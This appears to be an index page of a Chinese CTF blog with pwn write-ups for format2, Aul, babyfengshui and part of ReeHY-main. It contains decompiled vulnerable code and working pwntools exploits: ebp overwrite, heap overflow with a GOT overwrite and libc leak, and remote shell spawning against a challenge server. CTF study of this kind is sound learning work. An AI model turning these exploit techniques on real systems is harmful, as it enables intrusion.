<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="Soinux"><meta name="copyright" content="Soinux"><title>Soinux's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Soinux</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">10</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">3</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">3</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://www.baidu.com" target="_blank" rel="noopener">BestFriend</a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Soinux's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Soinux's Blog</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/04/21/format2/">format2</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-04-21</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/pwn/">pwn</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/pwn/">pwn</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctf/">ctf</a></span><div class="content"><h1 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;soinux&#x2F;ctf&#x2F;xctf&#x2F;pwn&#x2F;fmt2&#x2F;fmt2&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>关键的两个函数:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">correct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( input == <span class="number">-559038737</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Congratulation! you are good!"</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>一个看上去你永远得不到的函数,里面有诱人的getshell代码</li>
</ul>
<p>存在溢出点的函数:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL4 __cdecl <span class="title">auth</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> *s2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+20h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;v4, &amp;input, a1);</span><br><span class="line">  s2 = (<span class="keyword">char</span> *)calc_md5((<span class="keyword">int</span>)&amp;v2, <span class="number">12</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hash : %s\n"</span>, s2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(<span class="string">"f87cd601aa7fedca99018a8be88eda34"</span>, s2) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>虽然程序开了Canary 但是因为程序使用静态链接, 有些函数内并没有canary 就比如这个函数</li>
<li>memcpy(&amp;v4, &amp;input, a1) 可以覆盖<em>ebp(前面对解密后字符串长度有限制&lt;0xC,最多只能覆盖</em>ebp)</li>
</ul>
<p>我们将*ebp覆盖为xxxx 则auth函数leave后ebp=xxxx, 执行main函数leave后,esp=xxxx<br>最后main函数的ret 也即 call *(esp + 4) 即 call *(xxxx + 4),令xxxx=input_addr, *(xxxx + 4) = getshell_addr, 可getshell</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">sh = remote(host=<span class="string">'159.138.137.79'</span>, port=<span class="number">53309</span>)</span><br><span class="line">getshell_addr = <span class="number">0x08049284</span></span><br><span class="line">input_addr = <span class="number">0x0811eb40</span></span><br><span class="line">payload = <span class="string">b'aaaa'</span> + p32(getshell_addr) + p32(input_addr)</span><br><span class="line">payload = base64.b64encode(payload)</span><br><span class="line"><span class="comment">#程序读入字符串用的是scanf的%s, 遇到空白字符结束读入,所以这里用了sendline</span></span><br><span class="line">sh.sendlineafter(<span class="string">'Authenticate : '</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/04/21/Aul/">【攻防世界】 Aul</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-04-21</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/pwn/">pwn</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/pwn/">pwn</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctf/">ctf</a></span><div class="content"><blockquote>
<p> 这触及到了我的知识盲区</p>
</blockquote>
<h1 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h1><p>lua脚本语言， 可直接执行os.execute()</p>
<h1 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h1><p>学习lua.jpg<br>学完就更新</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/04/15/babyfengshui/">【攻防世界】 babyfengshui</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-04-15</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/pwn/">pwn</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctf/">ctf</a></span><div class="content"><h1 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;soinux&#x2F;ctf&#x2F;xctf&#x2F;pwn&#x2F;babyfengshui&#x2F;babyfengshui&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>整个程序主要函数为add，delete，update，display<br>add：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__cdecl <span class="title">Add</span><span class="params">(<span class="keyword">size_t</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// ST24_4</span></span><br><span class="line">  _DWORD *v2; <span class="comment">// ST28_4</span></span><br><span class="line"></span><br><span class="line">  s = <span class="built_in">malloc</span>(a1);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, a1);</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v2, <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">  *v2 = s;</span><br><span class="line">  ptr[(<span class="keyword">unsigned</span> __int8)user_cnt] = v2;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"name: "</span>);</span><br><span class="line">  read_n((<span class="keyword">char</span> *)ptr[(<span class="keyword">unsigned</span> __int8)user_cnt] + <span class="number">4</span>, <span class="number">124</span>);</span><br><span class="line">  Update(++user_cnt - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>连续申请了a1大小和0x80 的堆数据空间，后者前4为存了前者的指针，后124为存name</li>
</ul>
<p>update：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">Update</span><span class="params">(<span class="keyword">unsigned</span> __int8 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+17h] [ebp-11h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; (<span class="keyword">unsigned</span> __int8)user_cnt &amp;&amp; ptr[a1] )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"text length: "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%u%c"</span>, &amp;v3, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">char</span> *)(v3 + *(_DWORD *)ptr[a1]) &gt;= (<span class="keyword">char</span> *)ptr[a1] - <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"my l33t defenses cannot be fooled, cya!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"text: "</span>);</span><br><span class="line">    read_n(*(<span class="keyword">char</span> **)ptr[a1], v3 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这个函数里有个简单的堆溢出检查，不过只要让add中连续申请的两个堆块并不物理相邻就可以绕过</li>
</ul>
<p>至于delete 和 display并没有什么需要太在意的地方</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">sh = remote(host=<span class="string">''</span>, port=)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, name, length, text)</span>:</span></span><br><span class="line">  sh.sendlineafter(<span class="string">'Action: '</span>, <span class="string">'0'</span>)</span><br><span class="line">  sh.sendlineafter(<span class="string">'size of description: '</span>, str(size))</span><br><span class="line">  sh.sendafter(<span class="string">'name: '</span>, name)</span><br><span class="line">  sh.sendlineafter(<span class="string">'text length: '</span>, str(length))</span><br><span class="line">  sh.sendafter(<span class="string">'text: '</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delt</span><span class="params">(index)</span>:</span></span><br><span class="line">  sh.sendlineafter(<span class="string">'Action: '</span>, <span class="string">'1'</span>)</span><br><span class="line">  sh.sendlineafter(<span class="string">'index: '</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span><span class="params">(index)</span>:</span></span><br><span class="line">  sh.sendlineafter(<span class="string">'Action: '</span>, <span class="string">'2'</span>)</span><br><span class="line">  sh.sendlineafter(<span class="string">'index: '</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(index, length, text)</span>:</span></span><br><span class="line">  sh.sendlineafter(<span class="string">'Action: '</span>, <span class="string">'3'</span>)</span><br><span class="line">  sh.sendlineafter(<span class="string">'index: '</span>, str(index))</span><br><span class="line">  sh.sendlineafter(<span class="string">'text length: '</span>, str(length))</span><br><span class="line">  sh.sendafter(<span class="string">'text: '</span>, text)</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">'./babyfengshui'</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'soinux\n'</span>, <span class="number">0x8</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'soinux\n'</span>, <span class="number">0x1</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'soinux\n'</span>, <span class="number">0x1</span>, <span class="string">'b'</span>)</span><br><span class="line">delt(<span class="number">1</span>)</span><br><span class="line">free_got = e.got[<span class="string">'free'</span>]</span><br><span class="line">payload = <span class="string">b'a'</span> * (<span class="number">0x80</span> + <span class="number">0x80</span> + <span class="number">0x8</span> + <span class="number">0x90</span>) + p32(free_got)</span><br><span class="line">add(<span class="number">0x108</span>, <span class="string">'soinux\n'</span>, <span class="number">0x108</span> + <span class="number">0x90</span> + <span class="number">0x4</span>, payload)</span><br><span class="line">display(<span class="number">2</span>)</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvuntil(<span class="string">b' '</span>)</span><br><span class="line">free_addr = u32(sh.recvline()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">success(<span class="string">'free_addr: '</span> + hex(free_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">'free'</span>, free_addr)</span><br><span class="line"><span class="comment">#libc = ELF('./libc.so.6')</span></span><br><span class="line">libc_base = free_addr - libc.dump(<span class="string">'free'</span>)</span><br><span class="line">success(<span class="string">'libc_base: '</span> + hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">success(<span class="string">'system_addr: '</span> + hex(system_addr))</span><br><span class="line">update(<span class="number">2</span>, <span class="number">0x4</span>, p32(system_addr))</span><br><span class="line">delt(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/04/07/ReeHY-main/">【攻防世界】4-ReeHY-main-100</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-04-07</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/pwn/">pwn</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/pwn/">pwn</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctf/">ctf</a></span><div class="content"><h1 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;soinux&#x2F;ctf&#x2F;xctf&#x2F;pwn&#x2F;4-ReeHY-main&#x2F;main&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h1 id="思路一：栈溢出"><a href="#思路一：栈溢出" class="headerlink" title="思路一：栈溢出"></a>思路一：栈溢出</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  read_name();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    print_menu();</span><br><span class="line">    get_num();</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        create();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        <span class="keyword">delete</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"bye~bye~ young hacker"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid Choice!"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在create函数里存在一个整数溢出漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">create</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">void</span> *dest; <span class="comment">// [rsp+80h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = cnt;</span><br><span class="line">  <span class="keyword">if</span> ( cnt &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Input size"</span>);</span><br><span class="line">    result = get_num();</span><br><span class="line">    LODWORD(nbytes) = result;</span><br><span class="line">    <span class="keyword">if</span> ( result &lt;= <span class="number">4096</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Input cun"</span>);</span><br><span class="line">      result = get_num();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( result &lt;= <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        dest = <span class="built_in">malloc</span>((<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Input content"</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">112</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">read</span>(<span class="number">0</span>, dest, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">          <span class="built_in">memcpy</span>(dest, &amp;buf, (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)(content_size + <span class="number">4L</span>L * v3) = nbytes;</span><br><span class="line">        *((_QWORD *)&amp;content_ptrs + <span class="number">2</span> * v3) = dest;</span><br><span class="line">        exist_chk[<span class="number">4</span> * v3] = <span class="number">1</span>;</span><br><span class="line">        ++cnt;</span><br><span class="line">        result = fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们令nbytes为负数时， 程序会先读入(unsigned int)nbytes个字节到buf（栈）中，由于强制类型转换，显然可以造成栈溢出，有了栈溢出，一切都好搞了。不过还是要注意：</p>
<ol>
<li>malloc不用在意，malloc形参为size_t，一般为unsigned类型，传入负数不会影响后续操作</li>
<li>我们进行栈溢出时传入的数据会覆盖几个比较重要的值：<ul>
<li>nbytes：因为涉及到memcpy(dest, &amp;buf, (signed int)nbytes);为避免传入负数，我们要将nbyte覆盖成0</li>
<li>v3（懒得给它改名了）：v3不能太大，干脆给他也覆盖成0</li>
</ul>
</li>
</ol>
